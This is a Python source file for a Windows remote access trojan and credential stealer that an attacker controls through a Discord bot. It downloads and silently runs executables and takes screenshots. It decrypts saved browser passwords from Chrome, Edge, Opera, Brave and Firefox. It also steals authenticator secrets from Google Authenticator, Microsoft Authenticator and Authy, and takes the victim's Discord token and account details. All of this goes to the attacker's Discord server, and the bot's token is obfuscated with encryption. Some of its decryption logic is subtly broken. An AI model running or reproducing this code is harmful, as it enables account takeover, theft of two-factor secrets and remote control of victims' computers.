import os
import discord
import subprocess
from discord.ext import commands
from PIL import ImageGrab
import io
import platform
from cryptography.fernet import Fernet
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import requests

# Decrypting the token
key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
cipher_suite = Fernet(key)
encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token
TOKEN = cipher_suite.decrypt(encrypted_token).decode()

# Set up the bot
GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to download files to
DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"

# Ensure the download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

# Helper function to create or get the user's channel
async def get_or_create_channel(ctx, user_name):
    guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
    # Check if a channel with the name already exists
    channel = discord.utils.get(guild.text_channels, name=user_name.lower())
    if not channel:
        # If the channel doesn't exist, create it
        channel = await guild.create_text_channel(user_name)
    return channel

# Command to handle file sending
@bot.command()
async def send(ctx):
    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(DOWNLOAD_DIR, attachment.filename)

        # Download the file
        await attachment.save(file_path)

        # Now run the downloaded file silently (e.g., .exe, .bat)
        try:
            if file_path.endswith(".bat") or file_path.endswith(".exe"):
                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                await ctx.send(f"Executed {attachment.filename} successfully!")
            else:
                await ctx.send(f"Unsupported file type: {attachment.filename}")
        except Exception as e:
            await ctx.send(f"Failed to execute {attachment.filename}: {str(e)}")
    else:
        await ctx.send("No file attached. Please attach a file to send.")

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    # Take a screenshot using Pillow
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    await ctx.send("Here is the screenshot:", file=discord.File(byte_io, 'screenshot.png'))

# Function to decrypt Chrome passwords
def decrypt_chrome_password(cipher_text, key):
    cipher_text = base64.b64decode(cipher_text)
    iv = cipher_text[3:15]
    payload = cipher_text[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload).decode()

# Command to grab auto-fill passwords and cookies
@bot.command()
async def grab(ctx):
    browsers = ["chrome", "firefox", "edge", "opera", "operagx", "brave"]

    for browser in browsers:
        if browser == "chrome":
            db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
        elif browser == "firefox":
            db_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
            key_path = os.path.join(db_path, 'key4.db')
            logins_path = os.path.join(db_path, 'logins.json')
        elif browser == "edge":
            db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
            local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State')
        elif browser == "opera":
            db_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')
            local_state_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Local State')
        elif browser == "operagx":
            db_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable', 'Login Data')
            local_state_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable', 'Local State')
        elif browser == "brave":
            db_path = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data')
            local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State')

        try:
            if browser in ["chrome", "edge", "opera", "operagx", "brave"]:
                shutil.copy2(db_path, os.path.join(DOWNLOAD_DIR, 'Login Data'))
                shutil.copy2(local_state_path, os.path.join(DOWNLOAD_DIR, 'Local State'))
                with open(os.path.join(DOWNLOAD_DIR, 'Local State'), 'r') as f:
                    local_state = json.load(f)
                    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                conn = sqlite3.connect(os.path.join(DOWNLOAD_DIR, 'Login Data'))
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                passwords = cursor.fetchall()

                decrypted_passwords = []
                for url, username, encrypted_password in passwords:
                    decrypted_password = decrypt_chrome_password(encrypted_password, key)
                    decrypted_passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

                cursor.close()
                conn.close()

                password_file_path = os.path.join(DOWNLOAD_DIR, f"{browser}_passwords.txt")
                with open(password_file_path, "w") as f:
                    f.write("\n".join(decrypted_passwords))

                await ctx.send(file=discord.File(password_file_path))

            elif browser == "firefox":
                profiles = [f for f in os.listdir(db_path) if f.startswith('profile')]
                if not profiles:
                    await ctx.send(f"No Firefox profiles found.")
                    continue

                profile_path = os.path.join(db_path, profiles[0])
                key_path = os.path.join(profile_path, 'key4.db')
                logins_path = os.path.join(profile_path, 'logins.json')

                with open(key_path, 'r') as f:
                    key_data = f.read()

                with open(logins_path, 'r') as f:
                    logins_data = json.load(f)

                decrypted_logins = []
                for login in logins_data['logins']:
                    encrypted_username = login['encryptedUsername']
                    encrypted_password = login['encryptedPassword']
                    decrypted_username = win32crypt.CryptUnprotectData(encrypted_username, None, None, None, 0)[1].decode()
                    decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                    decrypted_logins.append(f"URL: {login['hostname']}\nUsername: {decrypted_username}\nPassword: {decrypted_password}\n")

                password_file_path = os.path.join(DOWNLOAD_DIR, f"{browser}_passwords.txt")
                with open(password_file_path, "w") as f:
                    f.write("\n".join(decrypted_logins))

                await ctx.send(file=discord.File(password_file_path))

        except Exception as e:
            await ctx.send(f"Failed to grab data for {browser}: {str(e)}")

# Function to extract Google Authenticator data
def extract_google_authenticator_data():
    db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Authenticator', 'database.db')
    if not os.path.exists(db_path):
        return None, None

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM accounts")
    accounts = cursor.fetchall()
    cursor.close()
    conn.close()

    if not accounts:
        return None, None

    names = []
    keys = []
    for account in accounts:
        names.append(account[1])
        keys.append(account[2])

    return names, keys

# Function to extract Microsoft Authenticator data
def extract_microsoft_authenticator_data():
    db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Packages', 'Microsoft.Authenticator_*', 'LocalState', 'appSettings.json')
    if not os.path.exists(db_path):
        return None, None

    with open(db_path, 'r') as f:
        data = json.load(f)

    if 'accounts' not in data:
        return None, None

    names = []
    keys = []
    for account in data['accounts']:
        names.append(account['displayName'])
        keys.append(account['secretKey'])

    return names, keys

# Function to extract Authy data
def extract_authy_data():
    db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Authy', 'authy.db')
    if not os.path.exists(db_path):
        return None, None

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM tokens")
    tokens = cursor.fetchall()
    cursor.close()
    conn.close()

    if not tokens:
        return None, None

    names = []
    keys = []
    for token in tokens:
        names.append(token[1])
        keys.append(token[2])

    return names, keys

# Command to grab authenticator app data
@bot.command()
async def auth(ctx):
    google_names, google_keys = extract_google_authenticator_data()
    microsoft_names, microsoft_keys = extract_microsoft_authenticator_data()
    authy_names, authy_keys = extract_authy_data()

    if google_names and google_keys:
        google_data = "\n".join([f"Name: {name}\nKey: {key}\n" for name, key in zip(google_names, google_keys)])
        await ctx.send("Google Authenticator Data:\n" + google_data)

    if microsoft_names and microsoft_keys:
        microsoft_data = "\n".join([f"Name: {name}\nKey: {key}\n" for name, key in zip(microsoft_names, microsoft_keys)])
        await ctx.send("Microsoft Authenticator Data:\n" + microsoft_data)

    if authy_names and authy_keys:
        authy_data = "\n".join([f"Name: {name}\nKey: {key}\n" for name, key in zip(authy_names, authy_keys)])
        await ctx.send("Authy Data:\n" + authy_data)

# Command to grab Discord token and account info
@bot.command()
async def discord(ctx):
    discord_path = os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')
    if not os.path.exists(discord_path):
        await ctx.send("Discord data not found.")
        return

    token = None
    for file in os.listdir(discord_path):
        if file.endswith('.log'):
            with open(os.path.join(discord_path, file), 'r', encoding='utf-8') as f:
                for line in f:
                    if 'token' in line:
                        token = line.split(': ')[1].strip()
                        break
        if token:
            break

    if not token:
        await ctx.send("Discord token not found.")
        return

    user_info = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': f'Bearer {token}'}).json()
    user_data = f"Username: {user_info['username']}#{user_info['discriminator']}\nID: {user_info['id']}\nEmail: {user_info['email']}\nPhone: {user_info['phone']}\nToken: {token}"
    await ctx.send("Discord User Info:\n" + user_data)

# On bot startup: Check and create the channel, ping @everyone in the corresponding channel
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the desktop name or username to create the channel
    desktop_name = platform.node()  # This is the name of the PC
    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found

    # Fetch the guild (server) by ID and the channel
    guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    channel = await get_or_create_channel(guild, channel_name)

    # Send a "ping" message to indicate the bot is online
    await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")

    print(f"Bot is online. Pinged channel: {channel.name}")

# Run the bot
def run_bot():
    print("Starting the bot...")
    bot.run(TOKEN)

if __name__ == "__main__":
    run_bot()
